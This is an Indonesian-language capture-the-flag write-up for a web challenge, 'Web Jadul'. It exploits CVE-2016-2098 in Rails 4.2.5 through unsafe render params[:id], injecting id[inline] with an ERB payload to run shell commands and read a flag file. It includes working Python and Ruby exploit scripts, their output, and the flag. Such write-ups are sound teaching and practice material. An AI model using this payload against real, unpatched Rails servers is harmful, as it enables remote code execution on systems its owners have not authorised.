# WriteUp: Web Jadul

## Overview

* **Judul:** Web Jadul
* **Kategori:** Input Injection / CVE
* **Poin:** 50
* **Deskripsi:** Ambil alih server.
* **URL:** `http://localhost:1337`

## Reconnaissance & Source Code Analysis

Langkah pertama adalah mengidentifikasi teknologi yang digunakan dan menganalisis kode sumber controller untuk mencari celah keamanan.

**Pemeriksaan `Gemfile`:**

```bash
$ docker exec webjadul-web-1 cat Gemfile
...
gem 'rails', '4.2.5'
...

```

Aplikasi menggunakan **Ruby on Rails versi 4.2.5**.

**Pemeriksaan Controller (`app/controllers/docs_controller.rb`):**

```bash
$ docker exec webjadul-web-1 cat app/controllers/docs_controller.rb
class DocsController < ApplicationController
  def index
  end

  def show
    render params[:id]
  end
end

```

**Pemeriksaan Routes (`config/routes.rb`):**

```bash
$ docker exec webjadul-web-1 cat config/routes.rb
Rails.application.routes.draw do
  root 'docs#index'
  get 'docs', to: 'docs#show'
end

```

## Vulnerability Analysis

Ditemukan penggunaan method `render` yang tidak aman pada `DocsController#show`:

```ruby
render params[:id]

```

Pada **Rails versi < 5.0.1** (termasuk 4.2.5), method `render` rentan terhadap manipulasi parameter. Jika penyerang mengirimkan parameter `id` bukan sebagai String, melainkan sebagai Hash dengan kunci `inline`, Rails akan merender value tersebut sebagai template ERB (Embedded Ruby).

**Celah: CVE-2016-2098**
Serangan dilakukan dengan menyuntikkan parameter `?id[inline]=<payload>`. Hal ini memaksa Rails mengeksekusi payload tersebut sebagai kode Ruby, yang memungkinkan **Remote Code Execution (RCE)**.

## Flag Discovery

Sebelum melakukan eksploitasi, dilakukan pencarian lokasi flag di dalam container karena lokasi standar tidak ditemukan.

```bash
$ docker exec webjadul-web-1 find / -name "*.txt*" 2>/dev/null
...
/ed8ced0a73ed69ad8b986afd93efd404.txt

```

Flag tersimpan dalam file dengan nama acak MD5: `/ed8ced0a73ed69ad8b986afd93efd404.txt`.

## Exploitation

Eksploitasi dilakukan dengan mengirimkan payload RCE untuk membaca file flag tersebut.

**Payload Ruby:**

```ruby
<%= %x(cat /ed8ced0a73ed69ad8b986afd93efd404.txt) %>

```

**Python Solver (`solver.py`):**

```python
import requests

# Config
BASE_URL = "http://localhost:1337"
ENDPOINT = "/docs"
FLAG_FILE = "/ed8ced0a73ed69ad8b986afd93efd404.txt"

def exploit():
    print(f"[*] Target: {BASE_URL}{ENDPOINT}")
    print(f"[*] Flag File: {FLAG_FILE}")
    print("[*] Sending Malicious Payload (Rails render RCE)...")

    # Payload: <%= %x(cat /path/to/flag) %>
    ruby_payload = f"<%= %x(cat {FLAG_FILE}) %>"

    # Parameter Injection: id[inline]
    # Memaksa Rails membaca params[:id] sebagai Hash { 'inline' => payload }
    params = {
        'id[inline]': ruby_payload
    }

    try:
        r = requests.get(f"{BASE_URL}{ENDPOINT}", params=params)
        
        if r.status_code == 200:
            print("\n[+] RCE SUCCESS! Response Body:")
            print("-" * 40)
            print(r.text.strip())
            print("-" * 40)
        else:
            print(f"[-] Failed. Status Code: {r.status_code}")
            
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()

```

**Ruby Solver (`solver.rb`):**

```ruby
require 'net/http'
require 'uri'

# Config
BASE_URL = "http://localhost:1337"
ENDPOINT = "/docs"
FLAG_FILE = "/ed8ced0a73ed69ad8b986afd93efd404.txt"

puts "[*] Target: #{BASE_URL}#{ENDPOINT}"
puts "[*] Flag File: #{FLAG_FILE}"

# Construct Payload
payload = "<%= %x(cat #{FLAG_FILE}) %>"

# Build URI with Query Parameters
uri = URI("#{BASE_URL}#{ENDPOINT}")
# Inject id[inline] parameter
params = { "id[inline]" => payload }
uri.query = URI.encode_www_form(params)

puts "[*] Sending Payload..."

begin
  response = Net::HTTP.get_response(uri)

  if response.is_a?(Net::HTTPSuccess)
    puts "\n[+] RCE SUCCESS! Output:"
    puts "-" * 40
    puts response.body.strip
    puts "-" * 40
  else
    puts "[-] Failed. Status: #{response.code}"
  end
rescue StandardError => e
  puts "[-] Error: #{e.message}"
end

```

## Execution Output

**Python Execution:**

```bash
$ ./solver.py
[*] Target: http://localhost:1337/docs
[*] Flag File: /ed8ced0a73ed69ad8b986afd93efd404.txt
[*] Sending Malicious Payload (Rails render RCE)...

[+] RCE SUCCESS! Response Body:
----------------------------------------
pwn{b223be89e6a2c03748922e9e7707ebb6}
----------------------------------------

```

**Ruby Execution:**

```bash
$ ruby solver.rb
[*] Target: http://localhost:1337/docs
[*] Flag File: /ed8ced0a73ed69ad8b986afd93efd404.txt
[*] Sending Payload...

[+] RCE SUCCESS! Output:
----------------------------------------
pwn{b223be89e6a2c03748922e9e7707ebb6}
----------------------------------------

```

## Flag

```
pwn{b223be89e6a2c03748922e9e7707ebb6}

```
